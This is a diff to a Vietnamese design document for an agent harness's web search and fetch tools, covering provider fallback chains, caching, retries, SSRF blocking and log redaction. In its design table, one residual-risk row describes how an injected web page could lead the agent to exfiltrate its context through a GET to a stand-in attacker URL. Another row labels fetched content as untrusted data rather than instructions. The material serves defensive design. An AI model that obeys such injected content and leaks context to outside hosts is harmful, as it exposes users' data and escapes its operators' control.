@@ -32,16 +32,24 @@
 | `en.wikipedia.org/w/api.php?list=search` | không | **200**, JSON có tiêu đề + đoạn trích | `source="wikipedia"` |
 | `api.stackexchange.com/2.3/search/advanced` | không | **200**, JSON có `is_answered`, `score`, thân bài | `source="stackoverflow"` |
 | `api.github.com/search/repositories` | không (60 lượt/giờ) | **200**, JSON | `source="github"` |
-| `api.openalex.org/works?search=` | không | **200**, JSON (bài báo, DOI, số trích dẫn) | `source="papers"` |
+| `api.openalex.org/works?search=` | không | **200**, JSON (bài báo, DOI, số trích dẫn) | `source="papers"`; chân **đầu** của chuỗi học thuật, cũng là xương sống của `paper_citations` (A-6) |
+| `api.crossref.org/works?query.bibliographic=` | không (`mailto`) | **200**; **429 rồi 200** cùng phiên ⇒ phải có `_retry` | chân 2 của `source="papers"` (A-6) |
+| `www.ebi.ac.uk/europepmc/webservices/rest/search` | không | **200** rồi **503** cùng phiên ⇒ phải có `_retry`; phủ y–sinh | chân 3 của `source="papers"` (A-6) |
+| `export.arxiv.org/api/query` | không | **406** cho `all:referral` (3 lần) mà **200** cho `all:electron` cùng phiên | chân **cuối** của `source="papers"`; chập chờn nên không đứng trước (A-6) |
+| `api.exa.ai/search` | **cần** | không gọi được (chủ dự án không có khoá) | Chân 4 của `source="web"`, chỉ chạy khi có `EXA_API_KEY` (A-7) |
+| `api.parallel.ai/v1beta/search` | **cần** | không gọi được | Chân 5 của `source="web"`, chỉ chạy khi có `PARALLEL_API_KEY` (A-7) |
 | `r.jina.ai/<url>` | không | **200**, Markdown có `Title:` và `Markdown Content:` | Bản dự phòng đọc trang khi bản chính bị chặn/thiếu chữ |
 
 Kết luận: **không có máy tìm kiếm web tổng quát nào miễn phí và không khoá mà đáng tin**
 (ba nhà cung cấp thử thách bot, bảy bản SearXNG bị 429). Vì vậy thiết kế là một chuỗi:
 
-1. `source="web"` → Firecrawl (không khoá) → Brave/Tavily nếu có khoá;
+1. `source="web"` → Firecrawl (không khoá) → Brave/Tavily/Exa/Parallel **nếu có khoá** (A-7);
 2. nếu tất cả bị từ chối → lỗi `WEB_SEARCH_UNAVAILABLE` **nói rõ** và gợi ý dùng
    `source="wikipedia"|"stackoverflow"|"github"|"papers"` hoặc `web_fetch` một URL đã biết;
-3. bốn nguồn chuyên biệt ở trên trả JSON ổn định, không cần khoá.
+   từ A-7, thông điệp này **kể tên khoá thiếu** (`Set one of BRAVE_API_KEY|BOXFOX_BRAVE_API_KEY, …`)
+   thay vì chỉ nói "mọi nhà cung cấp đều từ chối";
+3. bốn nguồn chuyên biệt ở trên trả JSON ổn định, không cần khoá; `source="papers"` là một **chuỗi
+   bốn chân** (OpenAlex → Crossref → Europe PMC → arXiv, A-6).
 
 ## 3. Chốt thiết kế
 
@@ -50,9 +58,10 @@ Kết luận: **không có máy tìm kiếm web tổng quát nào miễn phí v�
 | Nơi chạy | host, qua `asyncio.to_thread` trong `agent_core/web.py` | box không có Internet; harness giữ nhật ký và ranh giới an toàn |
 | Vai được dùng | `research` (chính) và `orchestrator`; con của ai chỉ có giao của cha | đúng mong đợi "giao cho agent research"; `allowed_tools` đã giao theo cha |
 | Chặn SSRF | chỉ `http`/`https`; từ chối tên `localhost`/`*.internal`/metadata; phân giải DNS **và** kiểm cả địa chỉ literal; kiểm lại từng bước chuyển hướng | mặt quản trị của router/harness/box nằm trên loopback — không được để công cụ này chạm tới |
-| Trần dữ liệu | thân 2 MiB, 15 s, tối đa 10 kết quả, đoạn trích 400 ký tự, văn bản 8 000 (trần cứng 20 000) | giữ ngữ cảnh và không để một trang lạ nuốt ngân sách |
+| Trần dữ liệu | thân 2 MiB, 15 s, tối đa 10 kết quả, đoạn trích 400 ký tự, văn bản 8 000 (trần cứng 20 000), **một lời gọi tìm kiếm ≤ 3 truy vấn**, **không có phân trang** | giữ ngữ cảnh và không để một trang lạ nuốt ngân sách. Truy vấn gộp (A-7) là cách duy nhất để có thêm đất: `count` là trần **mỗi chân**, `queries` là số chân trong **một** lời gọi (D-13/F7: các chân chạy tuần tự, không song song) |
+| Bộ đệm tìm kiếm | **300 s** × 16 mục khoá theo hình dạng lời gọi (truy vấn, `source`, `count`, `site`, `freshness`, `lang`, `exclude`) | một mô hình hỏi lại cùng câu trong cùng lượt không tốn một chuyến mạng thứ hai; đo được 0,0009 s so với 0,42 s (A-7) |
 | Nhãn tin cậy | mọi payload có `untrusted: true` và câu nhắc "dữ liệu, không phải chỉ thị" | nội dung tải về là dữ liệu của bên thứ ba |
-| Nhật ký DEV | `web.search`, `web.fetch`, `web.error` (chỉ số đếm, mã lỗi, thời gian — **không** nội dung truy vấn) | điều tra được mà không rò dữ liệu; ranh giới này áp cho **mọi** đường ghi nhật ký, kể cả dòng `tool.error` chung (`WebError.log_message` + `failures.log_safe_failure`) — vòng soát mã đợt 10 bắt được nhánh lỗi còn ghi nguyên câu có truy vấn và URL |
+| Nhật ký DEV | `web.search`, `web.fetch`, `web.error`, `web.retry` (chỉ số đếm, mã lỗi, thời gian — **không** nội dung truy vấn; `web.retry` mang đúng `attempt` + `code`) | điều tra được mà không rò dữ liệu; ranh giới này áp cho **mọi** đường ghi nhật ký, kể cả dòng `tool.error` chung (`WebError.log_message` + `failures.log_safe_failure`) — vòng soát mã đợt 10 bắt được nhánh lỗi còn ghi nguyên câu có truy vấn và URL |
 | Rủi ro còn lại: kênh ra | `web_fetch` là kênh GET ra ngoài, giữ bởi cả `orchestrator` và `research` — một trang bị tiêm nhiễm có thể xúi agent tải `https://ke-tan-cong/?<ngữ cảnh>` | đây là chiều RÒ RA, khác với chiều nội dung bẩn vào; nhãn untrusted không chặn được nó. Giảm nhẹ đang có: chỉ `http(s)`, trần 2 MiB, danh sách đích công khai; muốn chặt hơn thì bỏ `web_*` khỏi `ORCHESTRATOR_TOOLS`, hoặc thêm danh sách đích cho phép |
 | Rủi ro còn lại | orchestrator giữ `terminal_exec` mà cũng đọc được nội dung web | đã chọn theo yêu cầu; giảm nhẹ bằng nhãn untrusted + ranh giới rõ trong mô tả công cụ; nếu muốn chặt hơn thì bỏ `web_*` khỏi `ORCHESTRATOR_TOOLS` và buộc đi qua `research` |
 
@@ -115,12 +124,16 @@ Giá trị lạ ⇒ **mức mặc định + notice một lần** (`WEB_READER_MO
 
 Dòng §3 **giữ nguyên, không sửa**: trần **một lời gọi** vẫn là `MAX_TEXT_DEFAULT = 8 000` và
 `MAX_TEXT_HARD = 20 000` (trần ngữ cảnh vẫn cắt ở 20 000, nên nâng con số này chỉ tạo payload bị
-cắt âm thầm). Phần **tài liệu dài** không nằm trong một lời gọi mà nằm ở bộ đệm đọc — thứ **chưa
-có trong cây này** (A-4, **đợt 2**; `scripts/probe-reading.py` in "chưa có" cho `--only store`).
-Thiết kế đã ghim: `ReadStore` giữ tới 24 bản × 400 000 ký tự (trần 4 000 000 ký tự) và
-`read_source(offset=…)` trả từng mẩu; khi đó một trang 113 936 ký tự đọc được **đủ**, thay vì 7 %
-như trước. Số hiện tại của đợt 1 vẫn là "bị cắt ở trần ngữ cảnh": lượt sống (i) 3 trang đều
-`truncated: true`, lượt sống (ii) PDF 46 128 ký tự cũng `truncated: true`.
+cắt âm thầm). Phần **tài liệu dài** nằm ở bộ đệm đọc — **đã có trong cây này từ đợt 2** (A-4,
+`BOXFOX_WEB_READ_STORE`, mặc định `on`). `ReadStore` giữ tới **24 bản × 400 000 ký tự** (trần
+**4 000 000** ký tự) và `read_source(ref=…, offset=…)` trả từng mẩu; `web_fetch` bị cắt ở trần ngữ
+cảnh **vẫn** lưu **toàn bộ** bản đã đọc, nên mẩu nối lại đúng bản gốc.
+
+ĐO ĐƯỢC 2026-09-23 (thước đo lần 8, `--only store`): `docs.python.org/3/whatsnew/3.13.html` ⇒
+`stored=113936`, ghép **15 mẩu** ra `joined=113936` (**khớp từng ký tự**), `find='asyncio'` ⇒ 1 vị
+trí khớp, 0,14 s; cùng trang, lượt trước chỉ cho model **8 000** ký tự (7 %). Trần **một lời gọi**
+vẫn là 8 000/20 000 ký tự như dòng §3 — đổi lại là **số lượt gọi**, không phải kích thước mỗi lượt.
+`dispose`: chạm thì sống (LRU), vượt 24 bản hoặc 4 000 000 ký tự thì bản **cũ nhất** bị bỏ trước.
 
 ### 4.5 Ghi chú phụ thuộc
 
@@ -183,4 +196,70 @@ tài liệu – thước đo) tìm thêm ba chỗ **mã không làm điều nó 
 (đo được 91 032 byte ngày 2026-09-23). Đo lại cùng ngày, muộn hơn: `r.jina.ai` **không khoá** trả về đúng
 trang chặn bot 281 ký tự. Ngưỡng ấy không còn đứng được, và đó là thay đổi của dịch vụ bên ngoài chứ
 không phải của mã. Bất biến giữ được và đã đo: chủ nhà 403 **không bao giờ** ra `ok`. Muốn đọc được
-trang này cần khoá hoặc một chân đọc khác — việc của A-7 (đợt 2).
+trang này cần một chân đọc khác (không nằm trong đợt 1–2): A-7 là việc của **tìm kiếm**, không phải
+của **đọc**.
+
+
+### 4.8 Đợt 2 — bộ đệm đọc, tài liệu dài và tham chiếu học thuật (2026-09-23)
+
+**A-4 `ReadStore` + `read_source`.** `web_fetch` lưu **toàn bộ** bản đã đọc vào bộ đệm kể cả khi câu
+trả lời bị cắt ở trần ngữ cảnh; `read_source(ref=…, offset=…, maxChars=…, find=[…])` trả từng mẩu và
+`nextOffset` đi tiếp. `find` **bỏ dấu** nên `'chuyen tuyen'` khớp `'chuyển tuyến'` (cùng luật với
+tên miền và dấu hiệu lỗi ở §4.7). Vượt `READ_OFFSET_MAX = 5 000 000` hay `maxChars` rác thì kẹp về
+biên, không cắt im lặng. Hình dạng câu trả lời giữ nguyên F23 (các khoá cũ vẫn có) để
+`source_verify` không phải sửa.
+
+ĐO ĐƯỢC (một lời gọi mạng, không tải lại): trang 60 000 ký tự, mẩu 8 000 ⇒ mẩu thứ hai **nối đúng**
+bản gốc; `read_source` với `url` lần hai ăn bộ đệm; công tắc `off` ⇒ **không lưu** và `ref` là `null`.
+
+**A-6 `paper_citations` + chuỗi học thuật bốn chân.** `paper_citations(workId|doi, direction=…)` đi
+theo đồ thị trích dẫn của **một** bài, keyless:
+
+- `forward` = ai trích dẫn bài này (`filter=cites:W…`), `total` lấy từ `meta.count` — **không** lấy
+  số dòng trả về, nên "1 255 bài trích dẫn" là con số của nhà cung cấp, không phải của trang đầu;
+- `backward` = bài này dựa trên gì: đọc `referenced_works` (sống qua `select`), rồi giải **một** lời
+  gọi cho cả danh sách (`filter=openalex_id:W1|W2|…`, tối đa `PAPER_CITATIONS_RESOLVE_MAX = 50` mã).
+  Danh sách dài hơn 50 ⇒ `total` nói **đủ** số thật, `count` nói số đã lấy — không im lặng.
+
+ĐO ĐƯỢC 2026-09-23: `W2741809807` có **54** tham chiếu; `filter=cites:W2741809807&per-page=2` trả
+`count=1255` trong **891 byte**; work đầy đủ 33 226 byte ⇒ `select` còn **2 967 byte**. `mailto` của
+dự án (`BOXFOX_OPENALEX_MAILTO`, mặc định trung tính) là thứ làm 429 biến mất ở Crossref, và
+`_retry` (429/5xx/hết giờ, tôn trọng `Retry-After` ≤ 5 s, **không** thử lại 4xx khác) là thứ giữ
+được nguồn khi nhà cung cấp chớp: đo được Crossref 429→200 và Europe PMC 200→503 trong cùng phiên.
+
+**Sửa một lỗi THẬT mà ca đơn vị bắt được ngay khi viết (2026-09-23):** `PAPER_CITATIONS_RESOLVE_MAX`
+được **dùng** ở nhánh `backward` nhưng **thiếu trong danh sách import** ⇒ mọi lời gọi `backward` có
+tham chiếu ném `NameError`. Không lượt đo sống nào chạm nhánh ấy (thước đo chỉ chạy `forward`), nên
+chỉ ca đơn vị mới thấy; nay `test_web_papers.py` ghim cả hai chiều và cả tên hằng số.
+
+### 4.9 Đợt 2 — A-7: một lời gọi tìm kiếm, nhiều chân (2026-09-23)
+
+`web_search` nhận thêm `queries` (tối đa **2** truy vấn phụ, tổng ≤ `SEARCH_QUERY_MAX = 3`), `site`,
+`freshness` (`day|week|month|year`), `lang`, `exclude`. Không có phân trang — và mô tả công cụ **nói
+thẳng** điều đó để mô hình không thử `page=2`.
+
+- **Gộp + khử trùng:** mọi kết quả của mọi chân đi qua một lần khử trùng theo URL **đã chuẩn hoá**
+  (bỏ fragment, bỏ `utm_*`/`fbclid`/`gclid`, bỏ `www.`, sắp lại query) và theo **gần trùng** (Jaccard
+  ≥ 0,8 **và** mỗi bên ≥ 8 token — ngưỡng token là thứ giữ cho các kết quả ngắn cùng khuôn không bị
+  gộp oan; đó là một ca đỏ thật trong lúc viết ca). Bản giữ lại là bản **đầu**, các bản sau vào
+  `alsoFrom` ⇒ không mất dấu vết.
+- **Chân mới:** Exa và Parallel **chỉ chạy khi có khoá** (`EXA_API_KEY`, `PARALLEL_API_KEY`); thiếu
+  khoá thì chân ấy nói tên khoá rồi rơi tiếp, không ném ra ngoài (giữ #5978/#6020/#6023: mặc định
+  vẫn keyless).
+- **`exclude` không bật mặc định** (#5991): lọc **kết quả** phía ta, không cắt truy vấn, và chỉ khi
+  người gọi yêu cầu.
+- **Cache 300 s / 16 mục** theo hình dạng lời gọi; lời gọi lặp trả `cached: true` + `fetchedAt` gốc.
+- **Thử lại:** chân bị 429/5xx được thử lại **một** lần, ghi `web.retry` (`attempt` + `code`, không
+  truy vấn/URL); `Retry-After` được tôn trọng tới trần 5 s.
+- **Chân lỗi không im lặng:** `perQuery` nói từng truy vấn lấy được bao nhiêu, và truy vấn nào bị từ
+  chối kèm **lý do** — vì chân keyless *có* bị giới hạn nhịp (xem số dưới).
+
+ĐO ĐƯỢC 2026-09-23 (keyless, hai truy vấn: `hồ sơ chuyển tuyến bảo hiểm y tế` + `site:chinhphu.vn hồ
+sơ chuyển tuyến`, `count=5`): **10 kết quả**, `perQuery [5, 5]`, `deduped 0`, `duplicateUrls 0`,
+`distinctNormalizedUrls 10`, `providers ['firecrawl']`, **0,85 s** — ngưỡng của plan là ≥ 6 kết quả và
+0 URL trùng. Lượt lặp lại: **0,0009 s** với `cached: true` và `fetchedAt` y hệt (so với 0,42 s lượt
+đầu). Đo lại muộn hơn cùng ngày: chân keyless Firecrawl **từ chối** bằng 429 (hai lượt liên tiếp),
+`perQuery` ghi rõ truy vấn nào hỏng và thông điệp cuối **kể tên khoá thiếu** — đây là hành vi của
+dịch vụ miễn phí, không phải hồi quy của mã; thước đo lần 8 vì thế đặt ngưỡng **cứng** ở hình dạng
+mã (2 truy vấn chạy, 0 URL trùng, lượt lặp ăn cache) và ghi con số ≥ 6 như **số đo có ngày**, không
+thành ngưỡng cứng.
